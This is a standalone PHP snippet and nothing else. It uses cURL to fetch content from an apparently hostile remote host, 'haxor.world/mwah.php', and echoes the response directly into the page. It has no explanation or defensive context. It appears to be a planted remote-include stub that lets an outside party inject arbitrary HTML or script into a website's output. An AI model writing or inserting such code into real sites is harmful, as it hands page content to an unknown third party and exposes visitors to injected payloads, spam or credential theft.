<?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://haxor.world/mwah.php'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a; ?>
